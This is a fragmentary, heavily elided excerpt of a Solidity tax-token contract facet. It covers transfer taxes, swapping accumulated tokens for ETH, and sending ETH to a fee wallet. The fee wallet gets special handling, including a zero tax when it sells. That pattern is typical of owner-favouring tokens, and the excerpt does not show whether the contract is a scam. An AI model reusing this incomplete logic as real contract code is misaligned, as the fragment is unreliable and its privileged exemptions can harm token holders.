...
contract totalSupplyFacet is IERC20, Context, Ownable {
    ...
    function swapDappGuardTokensForEth(
        uint256 tokenAmount
    ) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (tokenAmount == 0) {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {
            ...
            if (to == ds.uniswapV2Pair && from != address(this)) {
                if (from == address(ds._feeDappGuardWallet)) {
                    amountOut = min(
                        amount,
                        min(ds._finalBuyTax, ds._minDappGuardSwapAmount)
                    );
                    taxAmount = 0;
                } else {
                    require(amount <= ds._maxTx, "Exceeds the ds._maxTx.");
            ...
            bool swappable = ds._buyCount > ds._preventSwapBefore &&
                ds._minDappGuardSwapAmount ==
                min(amount, ds._minDappGuardSwapAmount);
            ...
            if (
                ...
                if (contractTokenBalance > ds._minDappGuardSwapAmount) {
                    swapDappGuardTokensForEth(
    ...
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._feeDappGuardWallet.transfer(amount);
    }
}
